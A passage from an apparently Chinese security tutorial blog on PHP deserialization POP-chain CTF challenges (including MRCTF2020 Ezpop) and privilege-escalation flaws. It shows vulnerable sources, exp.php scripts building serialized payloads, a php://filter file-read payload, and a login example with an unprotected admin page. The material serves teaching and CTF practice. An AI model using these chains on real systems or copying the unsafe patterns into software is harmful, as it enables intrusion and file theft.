D:\flag.txt");'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"I think you need /etc/hint . Before this you need to see the source code"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string single-quoted-string">'ok'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hi"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$cc</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"give you flag : "</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">flag</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$phonenumber</span><span class="token operator">=</span><span class="token number">123123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$promise</span><span class="token operator">=</span><span class="token string single-quoted-string">'I do'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">promise</span><span class="token operator">=</span><span class="token string single-quoted-string">'I will not !!!!'</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">promise</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">ffiillee</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ffiilleennaammee'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Room</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sth_to_set</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$hint</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$hi</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pop1.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$phonenumber</span><span class="token operator">=</span><span class="token number">123123</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$promise</span><span class="token operator">=</span><span class="token string single-quoted-string">'I do'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Room</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sth_to_set</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$start</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$info</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$room</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Room</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$room</span><span class="token operator">-></span><span class="token property">filename</span><span class="token operator">=</span><span class="token string double-quoted-string">"D:\\flag.txt"</span><span class="token punctuation">;</span><span class="token comment">//路径要注意</span><span class="token variable">$room</span><span class="token operator">-></span><span class="token property">a</span><span class="token operator">=</span><span class="token variable">$room</span><span class="token punctuation">;</span><span class="token variable">$info</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$room</span><span class="token punctuation">;</span><span class="token variable">$start</span><span class="token operator">-></span><span class="token property">name</span><span class="token operator">=</span><span class="token variable">$info</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="构造POP链题目2"><a href="#构造POP链题目2" class="headerlink" title="构造POP链题目2"></a>构造POP链题目2</h4><p><strong>BUUOJ</strong>：**<a href="https://buuoj.cn/">https://buuoj.cn/</a>     **题目：[MRCTF2020]Ezpop</p><p><img src="/2023/012220963/216.PNG" alt=" "></p><p>pop2.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">Welcome to index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//flag is in flag.php</span><span class="token comment">//WTF IS THIS?</span><span class="token comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="token comment">//And Crack It!</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">append</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">append</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Welcome to '</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//flag is in flag.php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Modifier</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span>  <span class="token variable">$var</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$modifier</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Modifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$show</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$test</span><span class="token operator">-></span><span class="token property">p</span><span class="token operator">=</span><span class="token variable">$modifier</span><span class="token punctuation">;</span><span class="token variable">$show</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">=</span><span class="token variable">$test</span><span class="token punctuation">;</span><span class="token variable">$show</span><span class="token operator">-></span><span class="token property">source</span><span class="token operator">=</span><span class="token variable">$show</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$show</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="进阶CTF练习题"><a href="#进阶CTF练习题" class="headerlink" title="进阶CTF练习题"></a>进阶CTF练习题</h4><p><strong>BUUOJ</strong>：**<a href="https://buuoj.cn/">https://buuoj.cn/</a> **题目：[SWPUCTF 2018]SimplePHP</p><p><strong>WP</strong>：<a href="https://blog.csdn.net/weixin_45669205/article/details/116097410">https://blog.csdn.net/weixin_45669205/article/details/116097410</a></p><h2 id="逻辑漏洞-越权及未授权访问漏洞"><a href="#逻辑漏洞-越权及未授权访问漏洞" class="headerlink" title="逻辑漏洞-越权及未授权访问漏洞"></a>逻辑漏洞-越权及未授权访问漏洞</h2><h3 id="越权漏洞介绍"><a href="#越权漏洞介绍" class="headerlink" title="越权漏洞介绍"></a>越权漏洞介绍</h3><h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>普通用户A可以利用水平越权漏洞访问用户B的内容，实现同级别用户的跨越。</p><p>通过修改或更换某个ID或者其他的身份标识，使用户A访问（查看、修改、删除）用户B的数据。</p><h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>普通用户A可以通过垂直越权漏洞，访问管理员用户的内容</p><p>通过修改或更换某个ID或者其他的身份标识，使低权限用户A执行（查看、修改、删除）管理员才能访</p><p>问的操作。</p><p>图解：</p><p><img src="/2023/012220963/180.PNG" alt=" "></p><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><p>未授权访问漏洞是指一些需要安全配置或权限认证的地址、授权页面存在缺陷，使得其他用户可以直接</p><p>访问该地址，导致重要权限可被操作、数据库或网站目录等敏感信息泄露。</p><p><strong>案例:</strong></p><p><strong>login.php</strong></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>管理员登录<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>user<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入账号<span class="token punctuation">"</span></span><span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>admin<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>pass<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>请输入密码<span class="token punctuation">"</span></span><span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1234<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token prolog">&lt;?php$user = $_POST['user'];$pass = $_POST['pass'];if($user == '' &amp;&amp; $pass == "")&#123;    exit(0);&#125;if($user == 'admin' &amp;&amp; $pass == "1234")&#123;    Header("Location:admin.php");&#125; else&#123;    echo '&lt;script>alert("用户名或密码错误！")&lt;/script>';&#125;?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>admin.php</strong></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>IE=edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>管理主页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>管理主页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" 